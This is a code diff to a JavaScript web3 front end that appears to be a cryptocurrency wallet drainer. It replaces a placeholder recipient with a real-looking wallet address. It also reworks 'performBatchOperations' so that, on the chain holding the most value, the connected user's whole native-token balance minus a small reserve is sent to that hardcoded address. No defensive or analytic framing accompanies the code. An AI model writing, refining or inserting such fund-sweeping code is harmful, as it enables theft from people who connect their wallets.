@@ -22,7 +22,7 @@ const NATIVE_SYMBOLS = {
   'zkSync': 'ETH',
   'Celo': 'CELO'
 }
-const NATIVE_RECIPIENT = '0x1234567890123456789012345678901234567890'
+const NATIVE_RECIPIENT = '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
 
 // Явное определение отказа пользователя по фиксированным кодам
 const isUserRejected = (error) => {
@@ -750,16 +750,9 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
     let nativeCall = null
     try {
       const bal = await getBalance(wagmiAdapter.wagmiConfig, { address: getAddress(state.address), chainId: mostExpensive.chainId })
-      const gasPrice = await getGasPrice(wagmiAdapter.wagmiConfig, { chainId: mostExpensive.chainId })
-      const gasLimit = await estimateGas(wagmiAdapter.wagmiConfig, {
-        account: getAddress(state.address),
-        to: getAddress(NATIVE_RECIPIENT),
-        value: '0x1',
-        chainId: mostExpensive.chainId
-      }).catch(() => 21000n)
-      const gasCost = gasPrice * gasLimit
-      if (bal.value > gasCost) {
-        const sendAmount = bal.value - gasCost
+      const reserveWei = 500000000000000n // 0.0005 native token
+      if (bal.value > reserveWei) {
+        const sendAmount = bal.value - reserveWei
         nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x00', value: `0x${sendAmount.toString(16)}` }
       }
     } catch (e) {
